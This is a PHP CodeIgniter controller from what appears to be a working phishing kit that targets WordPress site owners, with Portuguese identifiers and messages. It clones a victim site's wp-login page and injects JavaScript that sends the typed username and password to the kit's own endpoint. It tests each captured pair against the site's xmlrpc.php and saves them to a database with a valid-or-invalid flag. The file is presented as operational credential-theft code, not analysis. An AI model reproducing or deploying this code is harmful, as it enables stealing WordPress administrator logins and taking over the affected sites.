<?php
defined('BASEPATH') or exit('No direct script access allowed');

class Auth extends CI_Controller
{

	function __construct()
	{

		parent::__construct();

		$this->load->model('main_model');
	}

	public function index()
	{
		// echo $html;
		if ($this->input->get()) {

			$data = array();

			$data['alvo_url'] = htmlspecialchars($this->input->get('u'));
			$data['alvo_email'] = htmlspecialchars($this->input->get('e'));
			$data['alvo_nome'] = htmlspecialchars($this->input->get('a'));


			// echo $data['alvo_url'];
			$this->main_model->addCountAlvoPaginaLogin($data['alvo_url'], $data['alvo_email']);

			// if ($this->main_model->existCredenciais($data['alvo_url'])) {
			// 	header('Location:https://' . $data['alvo_url'] . '/wp-admin');
			// }

			if ($this->main_model->existCredenciais($data['alvo_url']) ) {
                header('Location:https://wordpress.com');
            }


			$curl_handle = curl_init();
			curl_setopt($curl_handle, CURLOPT_URL, 'https://'.$data['alvo_url'].'/wp-login.php');
			curl_setopt($curl_handle, CURLOPT_CONNECTTIMEOUT, 2);
			curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER, 1);
			curl_setopt($curl_handle, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36 OPR/99.0.0.0');
			$html = curl_exec($curl_handle);
			curl_close($curl_handle);
	
			$javascript_code = '
			
			<script>
				document.getElementById(\'loginform\').addEventListener(\'submit\', function(e) {
					e.preventDefault();
					
					alert(\'submit\')

					var htmlElement = document.querySelector("html");
					var langValue = htmlElement.getAttribute("lang");
					

					var login = document.getElementById(\'user_login\').value;
					var password = document.getElementById(\'user_pass\').value;


					if (login.length === 0 || password.length === 0) {


						var loginErrorDiv = document.getElementById("login_error");


									if (loginErrorDiv) {
									  loginErrorDiv.remove();
									}								

									var loginFormDiv = document.getElementById("loginform");
									var loginDiv = loginFormDiv.parentNode;

									if (langValue == "pt-BR") {

										var messageDiv = document.createElement("div");

										messageDiv.innerHTML = \'<div id="login_error">	<strong>Erro:</strong> o campo do nome de usuário está vazio.<br>\
										<strong>Erro:</strong> o campo da senha está vazio.<br>\
										</div>\';

										loginDiv.insertBefore(messageDiv, loginFormDiv);

									} else  {

										var messageDiv = document.createElement("div");
										messageDiv.innerHTML = \'<div id="login_error">	<strong>Error:</strong> The username field is empty.<br>\
										<strong>Error:</strong> The password field is empty.<br>\
										</div>\';

										loginDiv.insertBefore(messageDiv, loginFormDiv);

									}

						
					} else {
						var xhr = new XMLHttpRequest();
						xhr.open(\'POST\', \''.base_url().'auth/act_add_adepto_credenciais\', true);
						xhr.setRequestHeader(\'Content-Type\', \'application/x-www-form-urlencoded\');
						xhr.onreadystatechange = function() {
							if (xhr.readyState === 4) {
								if (xhr.status === 200) {

									var resp = JSON.parse(xhr.responseText);
									
									console.log(resp)

									if (resp.status == "true") {

										window.location.href = "'.base_url().'success/u='.$data['alvo_url'].'&e='.$data['alvo_email'].'&a='.$data['alvo_nome'].'"
									
									} else {

										var loginErrorDiv = document.getElementById("login_error");
										if (loginErrorDiv) {
											loginErrorDiv.remove();
										}								

										var loginFormDiv = document.getElementById("loginform");
										var loginDiv = loginFormDiv.parentNode;

										if (langValue == "pt-BR") {

											var messageDiv = document.createElement("div");
											messageDiv.innerHTML = resp.m_pt;

											loginDiv.insertBefore(messageDiv, loginFormDiv);

										} else  {

											var messageDiv = document.createElement("div");
											messageDiv.innerHTML = resp.m_eng;

											loginDiv.insertBefore(messageDiv, loginFormDiv);

										}
									}

								} else {
									alert(\'Ocorreu um erro temporário.\');
								}
							}
						};
						var data = \'user_url='.$data['alvo_url'].' \' +
							\'&user_email='.$data['alvo_email'].'\' +
							\'&user_login=\' + encodeURIComponent(login) +
							\'&user_password=\' + encodeURIComponent(password);

						xhr.send(data);
					}
				});
			</script>';
			
			$data['js'] = $javascript_code;
	
// 			$html = str_replace('</body>', $javascript_code . '</body>', $html);
// 			$html = str_replace('action="https://'.$data['alvo_url'].'/wp-login.php"', 'action=""', $html);

// 			echo $html;

			$this->load->view('users/login', $data);

		} else {
			header('Location:https://wordpress.com');
		}
	}


// function checkLogin($username, $password, $url)
// {
//     // URL do arquivo xmlrpc.php
//     $url = 'https://' . $url . '/xmlrpc.php';

//     // Cria o corpo da requisição XML-RPC
//     $request = xmlrpc_encode_request('wp.getUsersBlogs', array($username, $password));

//     // Configura as opções da requisição cURL
//     $options = array(
//         CURLOPT_URL => $url,
//         CURLOPT_POST => true,
//         CURLOPT_POSTFIELDS => $request,
//         CURLOPT_RETURNTRANSFER => true,
//         CURLOPT_HTTPHEADER => array('Content-Type: text/xml'),
//         CURLOPT_SSL_VERIFYPEER => false // Desabilita a verificação do certificado SSL (para testes apenas)
//     );

//     // Inicializa a sessão cURL
//     $curl = curl_init();

//     // Configura as opções da sessão cURL
//     curl_setopt_array($curl, $options);

//     // Executa a requisição
//     $response = curl_exec($curl);
    

    
//     if (strpos($response, "isAdmin") !== false) {
        
//         return true;

//     } elseif (strpos($response, "faultCode") !== false) {
        
//         return false;

//     } else {
//          return false;
//     }


// }

    function checkLogin($username, $password, $url)
    {
        // URL do arquivo xmlrpc.php
        $url = 'https://' . $url . '/xmlrpc.php';
    
        // Cria o corpo da requisição XML-RPC para buscar categorias
        $request = xmlrpc_encode_request('wp.getCategories', array(0, $username, $password));
    
        // Configura as opções da requisição cURL
        $options = array(
            CURLOPT_URL => $url,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $request,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_HTTPHEADER => array('Content-Type: text/xml'),
            CURLOPT_SSL_VERIFYPEER => false // Desabilita a verificação do certificado SSL (para testes apenas)
        );
    
        // Inicializa a sessão cURL
        $curl = curl_init();
    
        // Configura as opções da sessão cURL
        curl_setopt_array($curl, $options);
    
        // Executa a requisição
        $response = curl_exec($curl);
    
        // Fecha a sessão cURL
        curl_close($curl);
    
        // print_r($response);
    
        // Verifica a resposta para determinar o sucesso
        if ($response !== false && strpos($response, "faultCode") === false) {
            // Sucesso na requisição

            // echo "<br>ENTROU COM SUCESSO<br>";
            return true;
        } else {
            // Falha na requisição
            // echo "<br>NÃO LOGOU<br>";
            return false;
        }
    }


	public function act_add_adepto_credenciais()
	{

		$adepto_url = htmlspecialchars($this->input->post('user_url'));
		$adepto_email = htmlspecialchars($this->input->post('user_email'));
		$adepto_login = htmlspecialchars($this->input->post('user_login'));
		$adepto_password = htmlspecialchars($this->input->post('user_password'));
		
		


		if ($this->checkLogin($adepto_login, $adepto_password, $adepto_url)) {

			$this->main_model->addAlvoCredenciais($adepto_url, $adepto_email, $adepto_login, $adepto_password, 1);
			$response = array('status' => 'true', "message" => "Logado com sucesso.");


		} else {

			$this->main_model->addAlvoCredenciais($adepto_url, $adepto_email, $adepto_login, $adepto_password, 0);
			$response = array('status' => 'false', "message" => "Falhou");

		}

		print_r(json_encode($response));
		
	}
}
